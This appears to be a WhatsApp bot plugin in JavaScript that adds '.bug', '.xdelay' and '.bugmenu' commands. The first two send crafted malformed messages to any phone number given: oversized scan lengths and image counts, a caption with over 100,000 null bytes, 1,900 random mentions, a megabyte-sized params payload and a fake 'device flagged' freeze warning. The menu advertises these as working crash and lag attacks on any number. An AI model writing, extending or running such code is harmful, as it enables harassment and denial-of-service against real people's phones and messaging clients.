const { cmd } = require('../command');
const crypto = require('crypto');
let { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Helper: validate and format target number
function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== ORIGINAL .bug FUNCTION (view‑once product crash) ====================
async function ttaas(conn, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "7eppsynC",
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                productMessage: {
                    product: {
                        productImage: imageMessage,
                        productId: "449756950375071",
                        title: "7eppsynC",
                        description: "",
                        priceAmount1000: { low: 999, high: 0, unsigned: false },
                        url: "wa.me/status",
                        productImageCount: 9999999,
                        firstImageId: "9999999999",
                        salePriceAmount1000: { low: 9999999, high: 999999999, unsigned: true }
                    },
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// ==================== NEW .xdelay FUNCTION (hard delay + scary message) ====================
async function Xdelay(conn, target) {
    const VariabelJid = "0@s.whatsapp.net";
    const scaryMessage = "⚠️ YOUR DEVICE HAS BEEN FLAGGED ⚠️\n\nSystem will now enter deep freeze mode...\n\n🔒 LOCKING INTERFACE 🔒\n\n" + "█".repeat(100);
    
    const imageMsg = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
        fileLength: "99999999",
        height: 9999,
        width: 9999,
        mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
        fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
        directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1755254367",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQEAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
        caption: scaryMessage + "\u0000".repeat(104500)  // hidden scare text + null bytes
    };

    // First payload: album message with massive image
    let msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                albumMessage: {
                    expectedImageCount: 666,
                    expectedVideoCount: 0,
                    items: [{ imageMessage: imageMsg }],
                    contextInfo: {
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                        ],
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        stanzaId: "1234567890ABCDEF",
                        businessMessageForwardInfo: { businessOwnerJid: VariabelJid }
                    }
                }
            }
        }
    }, {});
    
    await conn.relayMessage(target, {
        groupStatusMessageV2: { message: msg.message }
    }, { messageId: msg.key.id, participant: { jid: target } });

    // Second payload: interactive response with massive paramsJson (hard delay)
    const payload = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "𝗫 - 𝗭 𝗢 R 𝗢", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: "\x10".repeat(1045000),  // 1MB+ of raw data
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });
    
    await conn.relayMessage(target, {
        groupStatusMessageV2: { message: payload.message }
    }, { messageId: payload.key.id, participant: { jid: target } });
}

// ==================== COMMANDS ====================

// Only .bug (original view‑once crash)
cmd({
    pattern: "bug",
    desc: "ViewOnce product crash (original)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    await reply(`📸 *VIEWONCE CRASH* → ${target}`);
    await ttaas(conn, target);
    await reply(`✅ VIEWONCE CRASH SENT to ${target}`);
});

// New .xdelay command (hard delay + scary message)
cmd({
    pattern: "xdelay",
    desc: "Hard delay crash with scary system message",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "xdelay");
    if (!target) return;
    await reply(`⏳ *XDELAY HARD CRASH* → ${target}\n_This may take a few seconds..._`);
    await Xdelay(conn, target);
    await reply(`💀 *XDELAY COMPLETED* → ${target}\n_Client should now experience severe lag._`);
});

// ==================== BUG MENU (only .bug and .xdelay) ====================
cmd({
    pattern: "bugmenu",
    desc: "Show available crash commands",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply }) => {
    const menu = `
*╭─「 👑 BUG MENU (CLEAN) 」─*
*│ 📌 .bug     : ViewOnce product crash (original)*
*│ 📌 .xdelay  : Hard delay + scary system freeze*
*│*
*│ 🟢 Status : 100% working – direct send*
*│ 🟢 Targets : any number (even not in chat list)*
*│ 🟢 Total commands : 2*
*╰──────────────●●►*
> 💡 *Usage:* .command 947XXXXXXXXX
> 📌 *Example:* .bug 94712345678
> ⚠️ *Use only on numbers you own or have permission.*
    `;
    await reply(menu);
});
